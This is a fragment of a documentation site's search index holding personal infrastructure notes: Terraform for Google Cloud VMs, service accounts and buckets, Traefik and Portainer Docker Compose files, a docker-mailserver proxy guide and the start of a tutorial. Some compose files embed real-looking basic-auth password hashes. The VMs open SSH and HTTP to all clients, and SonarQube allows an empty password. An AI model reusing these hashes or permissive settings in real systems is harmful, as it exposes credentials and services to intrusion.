examples","text":""},{"location":"Terraform/Terraform_examples/#terraform","title":"Terraform","text":"<pre><code>#main.tf\nmodule \"alg\" {\n  source = \"./terraform_alg\"\n  environment = \"dev\"\n  region = \"us-east4\"\n  zone = \"us-east4-a\"\n}\n\nprovider \"github\" {\n  token = var.GH_TOKEN\n  owner = var.GH_OWNER\n}\n\noutput \"workspace\" {\n  value = terraform.workspace\n}\n\noutput \"alg_cloud_instance_name\" {\n  description = \"The name of the alg_cloud instance from the alg module\"\n  value       = module.alg.alg_cloud_instance_name\n}\n\noutput \"alg_cloud_instance_private_ip\" {\n  description = \"The private IP address of the alg_cloud instance from the alg module\"\n  value       = module.alg.alg_cloud_instance_private_ip\n}\n\n# output \"elk_instance_name\" {\n#   description = \"The name of the elk instance from the alg module\"\n#   value       = module.alg.elk_instance_name\n# }\n\n# output \"elk_instance_private_ip\" {\n#   description = \"The private IP address of the elk instance from the alg module\"\n#   value       = module.alg.elk_instance_private_ip\n# }\n\noutput \"wireguard_instance_name\" {\n  description = \"The name of the wireguard instance from the alg module\"\n  value       = module.alg.wireguard_instance_name\n}\n\noutput \"wireguard_instance_private_ip\" {\n  description = \"The private IP address of the wireguard instance from the alg module\"\n  value       = module.alg.wireguard_instance_private_ip\n}\n</code></pre> <pre><code>#Computer Engine\n# VM alg cloud\nresource \"google_compute_instance\" \"alg_cloud\" {\n  name         = \"cloud-luigi-preprod\"\n  machine_type = \"e2-medium\"\n  allow_stopping_for_update = true\n  zone         = \"${var.zone}\"\n  labels = {\n    environment = \"${var.environment}\"\n  }\n\n  boot_disk {\n    auto_delete = true\n    device_name = \"alg-cloud-${var.environment}\"\n    initialize_params {\n      image = \"ubuntu-2204-jammy-v20221018\"\n      size  = 30\n    }\n  }\n  metadata_startup_script = file(\"terraform_alg/start.sh\")\n\n  shielded_instance_config {\n    enable_secure_boot = true\n  }\n\n  network_interface {\n    network = \"car-us-brooklyn-lab-nprd-vpc\"\n    subnetwork = \"car-brooklyn-lab-nprd-01-us-ea4\"\n  }\n\n  tags = [\"allow-ingress-https-from-all-clients\", \"allow-ingress-http-from-all-clients\", \"allow-ingress-icmp-from-all-clients\", \"allow-ingress-ssh-from-all-clients\"]\n\n}\n\n# VM ELK\n\n# resource \"google_compute_instance\" \"elk\" {\n#   name         = \"elk-${var.environment}\"\n#   machine_type = \"n2-standard-2\"\n#   zone         = \"${var.zone}\"\n#   labels = {\n#     environment = \"${var.environment}\"\n#   }\n\n#   boot_disk {\n#     auto_delete = true\n#     device_name = \"elk-${var.environment}\"\n#     initialize_params {\n#       image = \"ubuntu-2204-jammy-v20221018\"\n#       size  = 20\n#     }\n#   }\n#   attached_disk {\n#     device_name = \"elk-data-${var.environment}\"\n#     mode        = \"READ_WRITE\"\n#     source      = google_compute_disk.elk-data.self_link\n#   }\n\n#   metadata_startup_script = file(\"terraform_alg/start.sh\")\n\n#   shielded_instance_config {\n#     enable_secure_boot = true\n#   }\n\n#   depends_on = [\n#     google_compute_disk.elk-data\n#   ]\n#   network_interface {\n#     network = \"car-us-brooklyn-lab-nprd-vpc\"\n#     subnetwork = \"car-brooklyn-lab-nprd-01-us-ea4\"\n#   }\n\n#   tags = [\"allow-ingress-https-from-all-clients\", \"allow-ingress-http-from-all-clients\", \"allow-ingress-icmp-from-all-clients\", \"allow-ingress-ssh-from-all-clients\"]\n\n# }\n\n# VM Wireguard\n\nresource \"google_compute_instance\" \"wireguard\" {\n  name         = \"wireguard\"\n  machine_type = \"e2-micro\"\n  allow_stopping_for_update = true\n  zone         = \"${var.zone}\"\n  labels = {\n    environment = \"${var.environment}\"\n  }\n\n  boot_disk {\n    auto_delete = true\n    device_name = \"wireguard-${var.environment}\"\n    initialize_params {\n      image = \"ubuntu-2204-jammy-v20221018\"\n      size  = 10\n    }\n  }\n  metadata_startup_script = file(\"terraform_alg/start.sh\")\n\n  shielded_instance_config {\n    enable_secure_boot = true\n  }\n\n  network_interface {\n    network = \"car-us-brooklyn-lab-nprd-vpc\"\n    subnetwork = \"car-brooklyn-lab-nprd-01-us-ea4\"\n  }\n\n  tags = [\"allow-ingress-https-from-all-clients\", \"allow-ingress-http-from-all-clients\", \"allow-ingress-icmp-from-all-clients\", \"allow-ingress-ssh-from-all-clients\"]\n\n}\n</code></pre> <pre><code>#Diks.tf\n## Disks + Snapshot policies applied\n\n\n# alg-cloud snapshot policy\nresource \"google_compute_disk_resource_policy_attachment\" \"attachment-alg-cloud\" {\n  name = google_compute_resource_policy.daily_snapshot.name\n  disk = google_compute_instance.alg_cloud.name\n  zone = var.zone\n}\n\n# wireguard snapshot policy\nresource \"google_compute_disk_resource_policy_attachment\" \"attachment-wireguard\" {\n  name = google_compute_resource_policy.daily_snapshot.name\n  disk = google_compute_instance.wireguard.name\n  zone = var.zone\n}\n\n# elk snapshot policy\n\n# resource \"google_compute_disk_resource_policy_attachment\" \"attachment-elk\" {\n#   name             = google_compute_resource_policy.daily_snapshot.name\n#   disk             = google_compute_instance.elk.name\n#   zone             = var.zone\n# }\n\n# resource \"google_compute_disk_resource_policy_attachment\" \"attachment-elk-data\" {\n#   name             = google_compute_resource_policy.daily_snapshot.name\n#   disk             = google_compute_disk.elk-data.name\n#   zone             = var.zone\n# }\n\n# resource \"google_compute_disk\" \"elk-data\" {\n#   name  = \"elk-data-${var.environment}\"\n#   type  = \"pd-ssd\"\n#   zone  = var.zone\n#   image = \"\"\n#   labels = {\n#     environment = \"${var.environment}\"\n#   }\n#   physical_block_size_bytes = 4096\n# }\n</code></pre> <pre><code>main.tf\n\n# GCP Provider\n\nprovider \"google\" {\n  project     = var.project_id\n  region      = var.region\n  zone        = var.zone\n}\n</code></pre> <pre><code>service_account.tf\n# resource \"google_service_account\" \"github-ar\" {\n#   account_id   = \"github-actions\"\n#   display_name = \"github-actions\"\n# }\n# resource \"google_service_account_key\" \"github-ar\" {\n#   service_account_id = google_service_account.github-ar.id\n# }\nresource \"google_service_account\" \"github-r\" {\n  account_id   = \"github-r\"\n  display_name = \"github-r\"\n}\n\nresource \"google_service_account\" \"github-rw\" {\n  account_id   = \"github-rw\"\n  display_name = \"github-rw\"\n}\n\nresource \"google_service_account_key\" \"github-r\" {\n  service_account_id = google_service_account.github-r.id\n  private_key_type  = \"TYPE_GOOGLE_CREDENTIALS_FILE\"\n}\n\nresource \"google_service_account_key\" \"github-rw\" {\n  service_account_id = google_service_account.github-rw.id\n  private_key_type  = \"TYPE_GOOGLE_CREDENTIALS_FILE\"\n}\n\n\nresource \"google_project_iam_member\" \"storage_object-r\" {\n  project = \"car-us-brooklyn-lab-nprd\"\n  member  = \"serviceAccount:${google_service_account.github-r.email}\"\n  role    = \"roles/storage.objectViewer\"\n}\n\nresource \"google_project_iam_member\" \"storage_object-rw\" {\n  project = \"car-us-brooklyn-lab-nprd\"\n  member  = \"serviceAccount:${google_service_account.github-rw.email}\"\n  role    = \"roles/storage.objectCreator\"\n}\n\n\n# resource \"google_project_iam_member\" \"artifactregistry_admin\" {\n#   project = \"car-us-brooklyn-lab-nprd\"\n#   member  = \"serviceAccount:${google_service_account.github.email}\"\n#   role    = \"roles/artifactregistry.admin\"\n# }\n\n\n# resource \"google_project_service\" \"artifact_registry\" {\n#   project = \"car-us-brooklyn-lab-nprd\"\n#   service = \"artifactregistry.googleapis.com\"\n# }\n\n# resource \"google_artifact_registry_repository\" \"github-container-registry\" {\n#   repository_id = \"github-container-registry\"\n#   location     = var.zone\n#   format       = \"DOCKER\"\n#   docker_config {\n#     immutable_tags = false\n#   }\n# }\n\n# output \"service_account_key_public\" {\n#   value       = jsonencode(google_service_account_key.github-rw-test)\n#   description = \"Service Account Key\"\n# }\n\n# resource \"local_file\" \"google_cloud_credentials_file\" {\n#   filename = \"/google_cloud_credentials.json\"\n#   content  = jsonencode(google_service_account_key.github-rw-file)\n# }\n\nresource \"github_actions_secret\" \"google_cloud_key-r\" {\n  repository       = \"alg-backend\"\n  secret_name      = \"GCP_PRIVATE_KEY_R\"\n  plaintext_value  = google_service_account_key.github-r.private_key\n}\n\nresource \"github_actions_secret\" \"google_cloud_key-rw\" {\n  repository       = \"alg-backend\"\n  secret_name      = \"GCP_PRIVATE_KEY_RW\"\n  plaintext_value  = google_service_account_key.github-rw.private_key\n}\n\n# resource \"github_actions_secret\" \"google_cloud_credential\" {\n#   repository       = \"alg-backend\"\n#   secret_name      = \"GCP_CREDENTIALS-RW\"\n#   plaintext_value  = jsonencode(google_service_account_key.github-rw)\n# }\n\n# resource \"github_actions_variable\" \"google_cloud_var\" {\n#   repository       = \"alg-backend\"\n#   variable_name    = \"GCP_JSON\"\n#   value            = google_service_account_key.github-rw\n# }\n\n\nresource \"google_storage_bucket\" \"alg-assets-prod\" {\n name          = \"alg-assets-prod\"\n location      = \"us-east4\"\n storage_class = \"STANDARD\"\n force_destroy = true\n uniform_bucket_level_access = true\n}\n\nresource \"google_storage_bucket\" \"alg-assets-preprod\" {\n name          = \"alg-assets-preprod\" \n location      = \"us-east4\"\n storage_class = \"STANDARD\"\n force_destroy = true\n uniform_bucket_level_access = true\n}\n\nresource \"google_storage_bucket\" \"alg-assets-qa\" {\n name          = \"alg-assets-qa\"\n location      = \"us-east4\"\n storage_class = \"STANDARD\"\n force_destroy = true\n uniform_bucket_level_access = true\n}\n</code></pre> <pre><code># variables.tf\n\n# VARIABLES\nvariable \"environment\" {\n  description = \"Environment name (e.g., dev, prod)\"\n  type        = string\n  default = \"dev\"\n}\n\n\nvariable \"project_id\" {\n  description = \"Google Cloud project ID\"\n  type        = string\n  default = \"car-us-brooklyn-lab-nprd\"\n}\n\nvariable \"region\" {\n  description = \"GCE instance region\"\n  type        = string\n  default = \"us-east4\"\n}\n\nvariable \"zone\" {\n  description = \"GCE instance zone\"\n  type        = string\n  default = \"us-east4-a\"\n}\n</code></pre> <pre><code>outputs.tf\n\noutput \"alg_cloud_instance_name\" {\n  description = \"The name of the alg_cloud instance\"\n  value       = google_compute_instance.alg_cloud.name\n}\n\noutput \"bucket_name_prod\" {\n  description = \"The name of the alg_cloud bucket prod\"\n  value       = google_storage_bucket.alg-assets-prod.name\n}\n\noutput \"bucket_name_preprod\" {\n  description = \"The name of the alg_cloud bucket preprod\"\n  value       = google_storage_bucket.alg-assets-preprod.name\n}\n\noutput \"bucket_name_qa\" {\n  description = \"The name of the alg_cloud bucket qa\"\n  value       = google_storage_bucket.alg-assets-qa.name\n}\n\n\noutput \"alg_cloud_instance_private_ip\" {\n  description = \"The private IP address of the alg_cloud instance\"\n  value       = google_compute_instance.alg_cloud.network_interface[0].network_ip\n}\n\n# output \"elk_instance_name\" {\n#   description = \"The name of the elk instance\"\n#   value       = google_compute_instance.elk.name\n# }\n\n# output \"elk_instance_private_ip\" {\n#   description = \"The private IP address of the elk instance\"\n#   value       = google_compute_instance.elk.network_interface[0].network_ip\n# }\n\noutput \"wireguard_instance_name\" {\n  description = \"The name of the elk instance\"\n  value       = google_compute_instance.wireguard.name\n}\n\noutput \"wireguard_instance_private_ip\" {\n  description = \"The private IP address of the elk instance\"\n  value       = google_compute_instance.wireguard.network_interface[0].network_ip\n}\n</code></pre>"},{"location":"Traefic/Install/","title":"Install","text":""},{"location":"Traefic/Install/#traefic","title":"Traefic","text":"<p>https://blog.elhacker.net/2022/01/traefik-un-proxy-inverso-para-contenedores-docker.html</p> <p>https://doc.traefik.io/traefik/v2.0/middlewares/basicauth/</p> <pre><code>version: '3'\n\n# echo $(htpasswd -nb &lt;USER&gt; &lt;PASSWORD&gt;) | sed -e s/\\\\$/\\\\$\\\\$/g\n\nservices:\n  whoami:\n    image: \"containous/whoami\"\n    container_name: \"simple-service\"\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.http.routers.whoami.rule=Host(`whoami.localhost`)\"\n      - \"traefik.http.routers.whoami.entrypoints=http\"\n  traefik:\n    image: traefik:v2.4.2\n    container_name: traefik\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - traefik-proxy\n    ports:\n      - 80:80\n      - 443:443\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./traefik-data/traefik.yml:/traefik.yml:ro\n      - ./traefik-data/acme.json:/acme.json\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.http.routers.traefik.entrypoints=http\"\n      - \"traefik.http.routers.traefik.rule=Host(`localhost`)\"\n      - \"traefik.http.middlewares.traefik-auth.basicauth.users=user:$$apr1$$dd0JhG/Z$$tvNh9gRhT3F/FNtyC3dPp/\"\n      - \"traefik.http.middlewares.test-auth.basicauth.users=user:$$apr1$$dd0JhG/Z$$tvNh9gRhT3F/FNtyC3dPp/,test2:$$apr1$$d9hr9HBB$$4HxwgUir3HP4EsggP/QNo0\"\n      - \"traefik.http.middlewares.traefik-https-redirect.redirectscheme.scheme=https\"\n      - \"traefik.http.routers.traefik.middlewares=traefik-https-redirect\"\n      - \"traefik.http.routers.traefik-secure.entrypoints=https\"\n      - \"traefik.http.routers.traefik-secure.rule=Host(`localhost`)\"\n      - \"traefik.http.routers.traefik-secure.middlewares=traefik-auth\"\n      - \"traefik.http.routers.traefik-secure.tls=true\"\n      - \"traefik.http.routers.traefik-secure.tls.certresolver=http\"\n      - \"traefik.http.routers.traefik-secure.service=api@internal\"\n\nnetworks:\n  traefik-proxy:\n    external: true\n</code></pre>"},{"location":"Traefic/Labels/","title":"Labels","text":"<pre><code>    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.app-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.app-secure.rule=Host(`bitsecret.duckdns.org`)\"\n      - \"traefik.http.routers.nginx-secure.service=api@internal\"\n      - \"traefik.http.services.nginx.loadbalancer.server.port=8080\"\n      - \"traefik.http.routers.nginx.service=nginx\"\n</code></pre> <pre><code>    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.app-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.app-secure.rule=Host(`bitsecret.duckdns.org`)\"\n      - \"traefik.http.routers.nginx-secure.service=api@internal\"\n      - \"traefik.http.services.nginx.loadbalancer.server.port=8080\"\n      - \"traefik.http.routers.nginx.service=nginx\"\n</code></pre> <pre><code>  sonarqube:\n    image: docker.io/bitnami/sonarqube:9\n    volumes:\n      - 'sonarqube_data:/bitnami/sonarqube'\n    depends_on:\n      - postgresql\n    environment:\n      # ALLOW_EMPTY_PASSWORD is recommended only for development.\n      - ALLOW_EMPTY_PASSWORD=yes\n      - SONARQUBE_DATABASE_HOST=postgresql\n      - SONARQUBE_DATABASE_PORT_NUMBER=5432\n      - SONARQUBE_DATABASE_USER=bn_sonarqube\n      - SONARQUBE_DATABASE_NAME=bitnami_sonarqube\n      - SONARQUBE_PORT_NUMBER=4200\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.sonar.entrypoints=websecure\"\n      - \"traefik.http.routers.sonar.rule=Host(`sqmybts.duckdns.org`)\"\n      - \"traefik.http.services.sonar.loadbalancer.server.port=4200\"\n    networks:\n      - public\n      - proxy\n    expose:\n      - 4200\nnetworks:\n    public:\n    proxy:\n      external: true\n</code></pre>"},{"location":"Traefic/compose/","title":"Compose","text":"<pre><code>version: '3'\n\n# echo $(htpasswd -nb &lt;USER&gt; &lt;PASSWORD&gt;) | sed -e s/\\\\$/\\\\$\\\\$/g\n\nservices:\n  whoami:\n    image: \"containous/whoami\"\n    container_name: \"simple-service\"\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.http.routers.whoami.rule=Host(`quiensoy.duckdns.org`)\"\n      - \"traefik.http.routers.whoami.entrypoints=http\"\n  traefik:\n    image: traefik:v2.4.2\n    container_name: traefik\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - traefik-proxy\n    ports:\n      - 80:80\n      - 443:443\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./traefik-data/traefik.yml:/traefik.yml:ro\n      - ./traefik-data/acme.json:/acme.json\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.http.routers.traefik.entrypoints=http\"\n      - \"traefik.http.routers.traefik.rule=Host(`traeffic.duckdns.org`)\"\n      - \"traefik.http.middlewares.traefik-auth.basicauth.users=admin:$$apr1$$jQNmMH0x$$Gop4wvcDcDE3NNynkb5iZ/\"\n      - \"traefik.http.middlewares.test-auth.basicauth.users=user:$$apr1$$qv5TEQ/X$$h9J43URfmFG0E65egLR4S1\"\n      - \"traefik.http.middlewares.traefik-https-redirect.redirectscheme.scheme=https\"\n      - \"traefik.http.routers.traefik.middlewares=traefik-https-redirect\"\n      - \"traefik.http.routers.traefik-secure.entrypoints=https\"\n      - \"traefik.http.routers.traefik-secure.rule=Host(`traeffic.duckdns.org`)\"\n      - \"traefik.http.routers.traefik-secure.middlewares=traefik-auth\"\n      - \"traefik.http.routers.traefik-secure.tls=true\"\n      - \"traefik.http.routers.traefik-secure.tls.certresolver=http\"\n      - \"traefik.http.routers.traefik-secure.service=api@internal\"\n\nnetworks:\n  traefik-proxy:\n    external: true\n</code></pre>"},{"location":"Traefic/mailserverProxy/","title":"Mailserver behind Proxy","text":""},{"location":"Traefic/mailserverProxy/#using-docker-mailserver-behind-a-proxy","title":"Using <code>docker-mailserver</code> behind a Proxy","text":""},{"location":"Traefic/mailserverProxy/#information","title":"Information","text":"<p>If you are hiding your container behind a proxy service you might have discovered that the proxied requests from now on contain the proxy IP as the request origin. Whilst this behavior is technical correct it produces certain problems on the containers behind the proxy as they cannot distinguish the real origin of the requests anymore.</p> <p>To solve this problem on TCP connections we can make use of the proxy protocol. Compared to other workarounds that exist (<code>X-Forwarded-For</code> which only works for HTTP requests or <code>Tproxy</code> that requires you to recompile your kernel) the proxy protocol:</p> <ul> <li>It is protocol agnostic (can work with any layer 7 protocols, even when encrypted).</li> <li>It does not require any infrastructure changes.</li> <li>NAT-ing firewalls have no impact it.</li> <li>It is scalable.</li> </ul> <p>There is only one condition: both endpoints of the connection MUST be compatible with proxy protocol.</p> <p>Luckily <code>dovecot</code> and <code>postfix</code> are both Proxy-Protocol ready softwares so it depends only on your used reverse-proxy / loadbalancer.</p>"},{"location":"Traefic/mailserverProxy/#configuration-of-the-used-proxy-software","title":"Configuration of the used Proxy Software","text":"<p>The configuration depends on the used proxy system. I will provide the configuration examples of traefik v2 using IMAP and SMTP with implicit TLS.</p> <p>Feel free to add your configuration if you achieved the same goal using different proxy software below:</p> Traefik v2<p>Truncated configuration of traefik itself:</p><pre><code>version: '3.8'\nservices:\n  reverse-proxy:\n    image: docker.io/traefik:latest # v2.5\n    container_name: docker-traefik\n    restart: always\n    command:\n      - \"--providers.docker\"\n      - \"--providers.docker.exposedbydefault=false\"\n      - \"--providers.docker.network=proxy\"\n      - \"--entrypoints.web.address=:80\"\n      - \"--entryPoints.websecure.address=:443\"\n      - \"--entryPoints.smtp.address=:25\"\n      - \"--entryPoints.smtp-ssl.address=:465\"\n      - \"--entryPoints.imap-ssl.address=:993\"\n      - \"--entryPoints.sieve.address=:4190\"\n    ports:\n      - \"25:25\"\n      - \"465:465\"\n      - \"993:993\"\n      - \"4190:4190\"\n[...]\n</code></pre><p>Truncated list of necessary labels on the <code>docker-mailserver</code> container:</p><pre><code>version: '3.8'\nservices:\n  mailserver:\n    image: docker.io/mailserver/docker-mailserver:latest\n    container_name: mailserver\n    hostname: mail\n    domainname: example.com\n    restart: always\n    networks:\n      - proxy\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.tcp.routers.smtp.rule=HostSNI(`*`)\"\n      - \"traefik.tcp.routers.smtp.entrypoints=smtp\"\n      - \"traefik.tcp.routers.smtp.service=smtp\"\n      - \"traefik.tcp.services.smtp.loadbalancer.server.port=25\"\n      - \"traefik.tcp.services.smtp.loadbalancer.proxyProtocol.version=1\"\n      - \"traefik.tcp.routers.smtp-ssl.rule=HostSNI(`*`)\"\n      - \"traefik.tcp.routers.smtp-ssl.tls=false\"\n      - \"traefik.tcp.routers.smtp-ssl.entrypoints=smtp-ssl\"\n      - \"traefik.tcp.routers.smtp-ssl.service=smtp-ssl\"\n      - \"traefik.tcp.services.smtp-ssl.loadbalancer.server.port=465\"\n      - \"traefik.tcp.services.smtp-ssl.loadbalancer.proxyProtocol.version=1\"\n      - \"traefik.tcp.routers.imap-ssl.rule=HostSNI(`*`)\"\n      - \"traefik.tcp.routers.imap-ssl.entrypoints=imap-ssl\"\n      - \"traefik.tcp.routers.imap-ssl.service=imap-ssl\"\n      - \"traefik.tcp.services.imap-ssl.loadbalancer.server.port=10993\"\n      - \"traefik.tcp.services.imap-ssl.loadbalancer.proxyProtocol.version=2\"\n      - \"traefik.tcp.routers.sieve.rule=HostSNI(`*`)\"\n      - \"traefik.tcp.routers.sieve.entrypoints=sieve\"\n      - \"traefik.tcp.routers.sieve.service=sieve\"\n      - \"traefik.tcp.services.sieve.loadbalancer.server.port=4190\"\n[...]\n</code></pre><p>Keep in mind that it is necessary to use port <code>10993</code> here. More information below at <code>dovecot</code> configuration.</p>"},{"location":"Traefic/mailserverProxy/#configuration-of-the-backend-dovecot-and-postfix","title":"Configuration of the Backend (<code>dovecot</code> and <code>postfix</code>)","text":"<p>The following changes can be achieved completely by adding the content to the appropriate files by using the projects function to overwrite config files.</p> <p>Changes for <code>postfix</code> can be applied by adding the following content to <code>docker-data/dms/config/postfix-main.cf</code>:</p> <pre><code>postscreen_upstream_proxy_protocol = haproxy\n</code></pre> <p>and to <code>docker-data/dms/config/postfix-master.cf</code>:</p> <pre><code>submission/inet/smtpd_upstream_proxy_protocol=haproxy\nsmtps/inet/smtpd_upstream_proxy_protocol=haproxy\n</code></pre> <p>Changes for <code>dovecot</code> can be applied by adding the following content to <code>docker-data/dms/config/dovecot.cf</code>:</p> <pre><code>haproxy_trusted_networks = &lt;your-proxy-ip&gt;, &lt;optional-cidr-notation&gt;\nhaproxy_timeout = 3 secs\nservice imap-login {\n  inet_listener imaps {\n    haproxy = yes\n    ssl = yes\n    port = 10993\n  }\n}\n</code></pre> <p>Note</p> <p>Port <code>10993</code> is used here to avoid conflicts with internal systems like <code>postscreen</code> and <code>amavis</code> as they will exchange messages on the default port and obviously have a different origin then compared to the proxy.</p>"},{"location":"Traefic/traf%2Bport/","title":"Traf+port","text":"<pre><code>version: \"3.3\"\n\nservices:\n  traefik:\n    container_name: traefik\n    image: \"traefik:latest\"\n    command:\n      - --entrypoints.web.address=:80\n      - --entrypoints.websecure.address=:443\n      - --providers.docker\n      - --log.level=ERROR\n      - --certificatesresolvers.leresolver.acme.httpchallenge=true\n      - --certificatesresolvers.leresolver.acme.email=your-email #Set your email address here, is for the generation of SSL certificates with Let's Encrypt. \n      - --certificatesresolvers.leresolver.acme.storage=./acme.json\n      - --certificatesresolvers.leresolver.acme.httpchallenge.entrypoint=web\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - \"/var/run/docker.sock:/var/run/docker.sock:ro\"\n      - \"./acme.json:/acme.json\"\n    labels:\n      - \"traefik.http.routers.http-catchall.rule=hostregexp(`{host:.+}`)\"\n      - \"traefik.http.routers.http-catchall.entrypoints=web\"\n      - \"traefik.http.routers.http-catchall.middlewares=redirect-to-https\"\n      - \"traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https\"\n\n  portainer:\n    image: portainer/portainer-ce:latest\n    command: -H unix:///var/run/docker.sock\n    restart: always\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - portainer_data:/data\n    labels:\n      # Frontend\n      - \"traefik.enable=true\"\n      - \"traefik.http.routers.frontend.rule=Host(`portainer.yourdomain.com`)\"\n      - \"traefik.http.routers.frontend.entrypoints=websecure\"\n      - \"traefik.http.services.frontend.loadbalancer.server.port=9000\"\n      - \"traefik.http.routers.frontend.service=frontend\"\n      - \"traefik.http.routers.frontend.tls.certresolver=leresolver\"\n\n      # Edge\n      - \"traefik.http.routers.edge.rule=Host(`edge.yourdomain.com`)\"\n      - \"traefik.http.routers.edge.entrypoints=websecure\"\n      - \"traefik.http.services.edge.loadbalancer.server.port=8000\"\n      - \"traefik.http.routers.edge.service=edge\"\n      - \"traefik.http.routers.edge.tls.certresolver=letsencrypt\"\n\n\nvolumes:\n  portainer_data:\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/","title":"Docker container management with Traefik v2 and Portainer","text":"<p>A configuration set-up for a Traefik v2 reverse proxy along with Portainer and Docker Compose.</p> <p>This set-up makes container management &amp; deployment a breeze and the reverse proxy allows for running multiple applications on one Docker host. Traefik will route all the incoming traffic to the appropriate docker containers and through the open-source app Portainer you can speed up software deployments, troubleshoot problems and simplify migrations.</p> <p>Detailed explanation how to use this in my blog post: Docker container management with Traefik v2 and Portainer</p>"},{"location":"Traefic/docker-traefik-portainer/#how-to-run-it","title":"How to run it?","text":"<pre><code>$  ./src\n$ cd src/core\n$ docker-compose up -d\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/","title":"Docker container management with Traefik v2 and Portainer","text":""},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#introduction","title":"Introduction \ud83d\udccc","text":"<p>Article level: Advanced</p> <p>I categorise every article based on the complexity. It\u2019s a good way to indicate wether you would be interested in reading this article. Click on the link above to see what this means.</p> <p>Prerequisites</p> <ul> <li>Ubuntu 20.04 server</li> <li>Docker &amp; Docker-Compose installed</li> <li>Domain name</li> </ul> <p>What are we creating?</p> <p>In this blog post we will dive into the world of containers. We will set-up a Traefik v2 reverse proxy along with Portainer, using Docker Compose.</p> <p>This set-up makes container management &amp; deployment a breeze and the reverse proxy allows for running multiple applications on one Docker host. This really brings down the overall overhead that would normally go along with running multiple docker applications, since everything is managed from one point. \ud83d\udc4c</p> <p>Traefik will route all the incoming traffic to the appropriate docker containers and through the open-source app Portainer you can speed up software deployments, troubleshoot problems and simplify migrations.</p> <p>As an final example we will deploy a containerized Node.js app into our new environment. Exciting, so let\u2019s start! \ud83d\ude80</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#what-is-traefik-v2","title":"What is Traefik v2? \u26aa\ufe0f","text":"<p>Traefik is a modern and lightweight reverse proxy and load balancer that makes deploying microservices very easy. It is designed to be as simple as possible to operate, but capable of handling large, highly-complex deployments.</p> <p>It also comes with a powerful set of middlewares that enhance its capabilities to include load balancing, API gateway, orchestrator ingress, as well as east-west service communication and more. It is written in Go and is packaged as a single binary file and available as a tiny official docker image.</p> <p>Traditional reverse-proxies require that you configure each route that will connect paths and subdomains to each microservice. In an environment where you add, remove, kill, upgrade, or scale your services many times a day, the task of keeping the routes up to date becomes tedious. \ud83d\ude1f</p> <p>Traefik listens to your service registry/orchestrator API and instantly generates the routes so your microservices are connected to the outside world \u2013 without further intervention from your part.</p> <p></p> <p>Some of Traefik\u2019s features further explained:</p> <ul> <li>Dynamic Routing: Once properly set-up, Traefik will dynamically add new services and containers as they come up to provide traffic routing to them. Let\u2019s say you have Traefik running and you want to add a new app, you just build your container and register a new endpoint and Traefik will automatically detect it and start routing traffic to it.</li> <li>Load balancer: If you have multiple instances of a container, then Traefik can provide load balancing between those instances.</li> <li>Letsencrypt: When properly configured, Traefik can not only route traffic to a newly discovered service, but also set up free SSL certs from Let\u2019s Encrypt. Afterwards it can then redirect all the http traffic to https through middlewares for enhanced security of your application.</li> <li>Web UI: It comes packed with a very useful management dashboard that helps you visualize all the traffic endpoints, services, middlewares and docker containers while showing potential warnings and errors as well.</li> </ul> <p></p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#what-is-portainer","title":"What is Portainer? \u2693\ufe0f","text":"<p>Portainer is a lightweight management UI which allows you to easily manage your Docker host or Swarm cluster.</p> <p>It is meant to be as simple to deploy as it is to use. It consists of a single container that can run on any Docker engine. It allows you to manage your Docker stacks, containers, images, volumes, networks and more! This will help with speeding up software deployments, troubleshooting problems and simplifying migrations. \ud83d\ude0d</p> <p>Portainer works by hiding the complexity that makes managing containers hard behind an easy to use GUI. By negating the need for users to use CLI, write YAML or understand manifests, Portainer makes deploying apps and troubleshooting problems so simple, anyone can do it.</p> <p></p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#building-our-stack","title":"Building our stack \ud83d\udea7","text":"<p>From this point on I am going to assume you have <code>docker</code> and <code>docker-compose</code> installed on your server and you are running Ubuntu 20.04. I used a Digital Ocean $5 droplet for this. If you sign up through this link you can get $100 worth of credit for free on there!</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#i-setting-up-dns-records","title":"I. Setting up DNS records","text":"<p>Alright so the first thing to do is setting up the appropiate domains so we can access our Portainer and Traefik dashboard. Just pick one of the domains you have horded over the years \ud83d\ude04</p> <p>Set them up like this, point to your server:</p> <pre><code>traefik.yourdomain.com\nportainer.yourdomain.com\n</code></pre> <p>In this way our Portainer &amp; Traefik dashboard will be available at the appropriate subdomains.</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#ii-creating-a-user-setting-up-the-directory","title":"II. Creating a user &amp; setting up the directory","text":"<p>Generally you want to avoid using your server as root, so register a user and add them to the sudo group and then switch to that user:</p> <pre><code>$ adduser raf\n$ usermod -aG sudo raf\n$ su - raf\n</code></pre> <p>Now it\u2019s time to set-up our directory. I already made the whole configuration and published it and you can therefore just clone or fork my repo. I will go over all the files to explain what is going on. So just run:</p> <pre><code>$ git clone https://github.com/rafrasenberg/docker-traefik-portainer ./src\n</code></pre> <p>Now <code>cd</code> into <code>src</code> and you should be greeted with this tree structure:</p> <pre><code>.\n\u2514\u2500\u2500 src/\n    